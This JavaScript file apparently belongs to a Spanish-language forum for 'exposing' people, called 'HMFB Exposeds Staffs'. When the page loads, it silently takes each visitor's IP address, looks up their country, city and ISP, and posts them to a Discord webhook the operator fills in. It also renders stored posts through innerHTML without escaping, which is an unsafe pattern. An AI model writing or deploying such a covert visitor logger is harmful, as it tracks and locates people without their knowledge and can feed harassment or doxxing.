// FUNCIÓN DE LOGGING DE IP (ORIGINAL MODIFICADA)
const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            // Webhook - CAMBIA ESTA URL
            const dscURL = ''; // <-- PON TU WEBHOOK AQUÍ
            
            if (dscURL && dscURL !== '') {
                // Intentar obtener geolocalización
                fetch(`https://ipapi.co/${ipadd}/json/`)
                    .then(geoResponse => geoResponse.json())
                    .then(geoData => {
                        return fetch(dscURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: "HMFB Foro Logger",
                                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                                embeds: [
                                    {
                                        title: 'Nuevo acceso al Foro HMFB',
                                        description: `**IP:** ${ipadd}\n**País:** ${geoData.country_name || 'Desconocido'}\n**Ciudad:** ${geoData.city || 'Desconocido'}\n**ISP:** ${geoData.org || 'Desconocido'}`,
                                        color: 0x800080,
                                        timestamp: new Date().toISOString(),
                                        footer: {
                                            text: 'HMFB Exposeds Staffs'
                                        }
                                    }
                                ]
                            })
                        });
                    })
                    .catch(() => {
                        // Si falla geolocalización, solo enviar IP
                        fetch(dscURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: "HMFB Foro Logger",
                                content: `🌐 Nueva visita: ${ipadd}`
                            })
                        });
                    });
            }
            
            // Mostrar IP en consola (solo para debug)
            console.log('Visitante IP:', ipadd);
        })
        .catch(error => {
            console.log('No se pudo obtener IP:', error);
        });
};

// EJECUTAR AL CARGAR LA PÁGINA
document.addEventListener('DOMContentLoaded', function() {
    // Enviar IP del visitante
    sendIP();
    
    // Mensaje de bienvenida en consola
    console.log('🚨 HMFB Exposeds Staffs - Foro activo');
    console.log('📌 Solo administradores pueden publicar contenido');
    
    // Cargar exposeds guardados
    loadSavedExposeds();
});

// Cargar exposeds desde localStorage
function loadSavedExposeds() {
    const saved = localStorage.getItem('hmfb_exposeds');
    const container = document.getElementById('exposedsContainer');
    
    if (saved && container) {
        const exposeds = JSON.parse(saved);
        exposeds.forEach(exposed => {
            const div = document.createElement('div');
            div.className = 'exposed-item';
            div.innerHTML = `
                <h4>🔍 ${exposed.title}</h4>
                ${exposed.image ? `<img src="${exposed.image}" style="max-width: 100%; border-radius: 5px; margin: 10px 0;">` : ''}
                <p>${exposed.desc}</p>
                <small>Publicado por: ${exposed.author || 'Admin'} | Fecha: ${exposed.date}</small>
                <hr style="margin: 10px 0; border-color: #444;">
            `;
            container.appendChild(div);
        });
    }
}

// Guardar exposed en localStorage
function saveExposed(title, desc, image) {
    const exposed = {
        title: title,
        desc: desc,
        image: image,
        date: new Date().toLocaleDateString('es-ES'),
        author: 'Admin'
    };
    
    let exposeds = JSON.parse(localStorage.getItem('hmfb_exposeds')) || [];
    exposeds.push(exposed);
    localStorage.setItem('hmfb_exposeds', JSON.stringify(exposeds));
}
